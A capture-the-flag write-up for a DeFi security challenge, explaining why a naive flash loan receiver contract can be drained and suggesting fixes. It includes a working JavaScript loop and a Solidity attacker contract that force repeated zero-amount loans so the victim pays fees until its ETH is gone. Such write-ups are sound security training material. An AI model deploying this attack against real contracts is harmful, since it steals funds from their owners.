# Challenge #0 - Naive Receiver

## Description

There's a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance.

You also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiveing flash loans of ETH.

Drain all ETH funds from the user's contract. Doing it in a single transaction is a big plus ;)

## What we have

We have 2 contracts here:

1. `FlashLoanReceiver.sol`: A naive flash loan receiver?
2. `NaiveReceiverLenderPool`: Flash loan pool offering ETH.

Looking at the contracts, we find these issues:

## Issues in FlashLoanReceiver

### 1. Receiver can receive zero ETH

Adding `require(msg.value > 0)` will fix this.

### 2. Receiver doesn't revert even if no gains are made

Receiver should check if its ETH balance has increase after `_executeActionDuringFlashLoan()` and accordingly `revert` the transaction. Currently, it ends up paying fees even on no gains.

### 3. No reentrancy checks

There is a risk of `pool` doing a reentrancy attack on the receiver. Although if `pool` is trusted, this check might be omitted.

## Solution

The secret to solving this is in issue #2. We can initiate 10 flash loans, and each time receiver will pay 1 ETH as fee, thus completely draining the receiver contract at the end.

This can be done in a single transaction using a contract, or multiple repetiting transactions triggered by a script.

```ts
// The naive solution
for (let i = 0; i < 10; i++)
  await this.pool.flashLoan(this.receiver.address, "0");
```

```js
// The better (cheaper) solution

// Solidity
pragma solidity ^0.8.0;

interface INaiveReceiverLenderPool {
    function flashLoan(address borrower, uint256 borrowAmount) external;
}

contract NaiveAttacker {
    constructor(address _lender, address _receiver) {
        uint repetitions = _receiver.balance / 1 ether;
        for (uint8 i = 0; i < repetitions; i++)
            INaiveReceiverLenderPool(_lender).flashLoan(_receiver, 0);
    }
}

// Test script
const AttackerFactory = await ethers.getContractFactory("NaiveAttacker");
    await AttackerFactory.deploy(this.pool.address, this.receiver.address);
```

## Probable Fix

Checking if the gains made were worth the flashloan fees (and the gas fees submitted at transaction), and reverting if it didn't, would have fixed this.
